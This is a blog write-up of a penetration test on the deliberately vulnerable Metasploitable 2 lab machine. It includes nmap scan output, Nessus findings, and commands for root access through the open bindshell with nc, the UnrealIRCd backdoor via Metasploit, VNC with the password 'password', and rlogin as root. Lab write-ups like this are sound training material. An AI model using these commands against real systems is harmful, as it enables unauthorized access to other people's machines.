---
layout: post
title:  Hacking Metasploitable 2
subtitle: Conducting a penetration testing on Metasploitable 2.
date:   2022-05-11
tags: [writeup, cybersecurity]
author: Patrick Castro
comments: True
---

>This is how I conducted VAPT on Metasploitable machine.

# Metasploitable 2

![](/assets/img/metasploitable2/metasploitable2.png)

***

## Intelligence Gathering

### 1. Conduct nmap scan

**NMAP - Normal Service Detection Scan**
```bash
┌──(kali㉿kali)-[~]
└─$ nmap -sV 192.168.179.134                  
Starting Nmap 7.92 ( https://nmap.org ) at 2022-05-09 22:18 EDT
Nmap scan report for 192.168.179.134
Host is up (0.0014s latency).
Not shown: 977 closed tcp ports (conn-refused)
PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 2.3.4
22/tcp   open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
23/tcp   open  telnet      Linux telnetd
25/tcp   open  smtp        Postfix smtpd
53/tcp   open  domain      ISC BIND 9.4.2
80/tcp   open  http        Apache httpd 2.2.8 ((Ubuntu) DAV/2)
111/tcp  open  rpcbind     2 (RPC #100000)
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
512/tcp  open  exec        netkit-rsh rexecd
513/tcp  open  login       OpenBSD or Solaris rlogind
514/tcp  open  tcpwrapped
1099/tcp open  java-rmi    GNU Classpath grmiregistry
1524/tcp open  bindshell   Metasploitable root shell
2049/tcp open  nfs         2-4 (RPC #100003)
2121/tcp open  ftp         ProFTPD 1.3.1
3306/tcp open  mysql       MySQL 5.0.51a-3ubuntu5
5432/tcp open  postgresql  PostgreSQL DB 8.3.0 - 8.3.7
5900/tcp open  vnc         VNC (protocol 3.3)
6000/tcp open  X11         (access denied)
6667/tcp open  irc         UnrealIRCd
8009/tcp open  ajp13       Apache Jserv (Protocol v1.3)
8180/tcp open  http        Apache Tomcat/Coyote JSP engine 1.1
Service Info: Hosts:  metasploitable.localdomain, irc.Metasploitable.LAN; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.71 seconds
```

**NMAP - Service Detection Scan in all ports**
```bash
┌──(kali㉿kali)-[~]
└─$ nmap -sV -p- 192.168.179.134
Starting Nmap 7.92 ( https://nmap.org ) at 2022-05-09 22:46 EDT
Nmap scan report for 192.168.179.134
Host is up (0.0011s latency).
Not shown: 65505 closed tcp ports (conn-refused)
PORT      STATE SERVICE     VERSION
21/tcp    open  ftp         vsftpd 2.3.4
22/tcp    open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
23/tcp    open  telnet      Linux telnetd
25/tcp    open  smtp        Postfix smtpd
53/tcp    open  domain      ISC BIND 9.4.2
80/tcp    open  http        Apache httpd 2.2.8 ((Ubuntu) DAV/2)
111/tcp   open  rpcbind     2 (RPC #100000)
139/tcp   open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp   open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
512/tcp   open  exec        netkit-rsh rexecd
513/tcp   open  login       OpenBSD or Solaris rlogind
514/tcp   open  tcpwrapped
1099/tcp  open  java-rmi    GNU Classpath grmiregistry
1524/tcp  open  bindshell   Metasploitable root shell
2049/tcp  open  nfs         2-4 (RPC #100003)
2121/tcp  open  ftp         ProFTPD 1.3.1
3306/tcp  open  mysql       MySQL 5.0.51a-3ubuntu5
3632/tcp  open  distccd     distccd v1 ((GNU) 4.2.4 (Ubuntu 4.2.4-1ubuntu4))
5432/tcp  open  postgresql  PostgreSQL DB 8.3.0 - 8.3.7
5900/tcp  open  vnc         VNC (protocol 3.3)
6000/tcp  open  X11         (access denied)
6667/tcp  open  irc         UnrealIRCd
6697/tcp  open  irc         UnrealIRCd
8009/tcp  open  ajp13       Apache Jserv (Protocol v1.3)
8180/tcp  open  http        Apache Tomcat/Coyote JSP engine 1.1
8787/tcp  open  drb         Ruby DRb RMI (Ruby 1.8; path /usr/lib/ruby/1.8/drb)
42589/tcp open  status      1 (RPC #100024)
46858/tcp open  mountd      1-3 (RPC #100005)
47442/tcp open  nlockmgr    1-4 (RPC #100021)
60821/tcp open  java-rmi    GNU Classpath grmiregistry
Service Info: Hosts:  metasploitable.localdomain, irc.Metasploitable.LAN; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 130.90 seconds
```

<br>

### 2. Checking the Web interface
![](/assets/img/metasploitable2/Pasted image 20220510102031.png)

<br>

### Information Disclosure
- Operating System: Linux Ubuntu: 4.2.4 / Linux Kernel 2.6 on Ubuntu 8.04 (hardy)
- Interesting services and ports from nmap results

```
PORT      STATE SERVICE     VERSION
- 21/tcp    open  ftp         vsftpd 2.3.4
- 22/tcp    open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
- 23/tcp    open  telnet      Linux telnetd
- 25/tcp    open  smtp        Postfix smtpd
- 139/tcp   open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
- 445/tcp   open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
- 512/tcp   open  exec        netkit-rsh rexecd
- 1524/tcp  open  bindshell   Metasploitable root shell
- 2121/tcp  open  ftp         ProFTPD 1.3.1
- 3306/tcp  open  mysql       MySQL 5.0.51a-3ubuntu5
- 3632/tcp  open  distccd     distccd v1 ((GNU) 4.2.4 (Ubuntu 4.2.4-1ubuntu4))
- 5432/tcp  open  postgresql  PostgreSQL DB 8.3.0 - 8.3.7
- 5900/tcp  open  vnc         VNC (protocol 3.3)
- 8180/tcp  open  http        Apache Tomcat/Coyote JSP engine 1.1
- 8009/tcp  open  ajp13       Apache Jserv (Protocol v1.3)
```

***

## Vulnerability Analysis

### Nessus Scan
- Perform - Basic Network Scan to Metasploitable 2 machine

#### Interesting Stuff from Nessus Scan
- Apache Tomcat AJP Connector Request Injection
- Bind Shell Backdoor Detection
- Denial of Service
- Samba Badlock vulnerability
- SMB null session authentication
- NFS Exported Share Information Disclosure
- UnrealIRCd Backdoor Detection
- VNC Server 'password' Password
- rexecd Service Detection
- Apache tomcat default files
- Unencrypted Telnet Server

***

## Exploitation

### 1. Gain root access using Netcat
**Vulnerability:** Bind Shell Backdoor Detection
- A shell is listening on the remote port without any authentication being required

**Information:**<br>
The IP of the target: `192.168.179.134` <br>
The port of open shell (obtained from nmap): `1524` 

```
1524/tcp  open  bindshell   Metasploitable root shell
```

**Exploit:**
```bash
nc 192.168.179.134 1524
```

![](/assets/img/metasploitable2/Pasted image 20220511175156.png)

### 2. Gain access using UnrealIRCd Backdoor | Metasploit
**Vulnerability:** UnrealIRCd Backdoor Detection
- The remote IRC server is a version of UnrealIRCd with a backdoor that allows an attacker to execute arbitrary code on the affected host.

**Information:**

The IP of the target: `192.168.179.134`
```
6667/tcp  open  irc         UnrealIRCd
6697/tcp  open  irc         UnrealIRCd
```
RPORT: `6697`

**Payload:** 
```
2   payload/cmd/unix/bind_ruby      normal  No     Unix Command Shell, Bind TCP (via Ruby)
```

![](/assets/img/metasploitable2/Pasted image 20220511182620.png)

**Exploit:**
![](/assets/img/metasploitable2/Pasted image 20220511182700.png)

### 3.  Gain access using vnc 
**Vulnerability:** VNC Server 'password' Password
- The VNC server running on the remote host is secured with a weak password. Nessus was able to login using VNC authentication and a password of 'password'. A remote, unauthenticated attacker could exploit this to take control of the system.

**Information:**
The IP of the target: `192.168.179.134`
```
5900/tcp  open  vnc         VNC (protocol 3.3)
```

**Exploit:**
```
vncviewer 192.168.179.134:5900
```

![](/assets/img/metasploitable2/Pasted image 20220511183852.png)

**Password:** `password` (based from the Nessus scan)

![](/assets/img/metasploitable2/Pasted image 20220511183957.png)

![](/assets/img/metasploitable2/Pasted image 20220511184043.png)

### 4. Gain access using rlogin
**Vulnerability:** rexecd Service Detection
- The rexecd service is running on the remote host. This service is design to allow users of a network to execute commands remotely. However, rexecd does not provide any good means of authentication, so it may be abused by an attacker to scan a third-party host.

**Information:**
```
512/tcp   open  exec        netkit-rsh rexecd
```

**Exploit:**
```
rlogin -l root 192.168.179.134
```

![](/assets/img/metasploitable2/Pasted image 20220511190005.png)

***

That's all, thank you for reading.


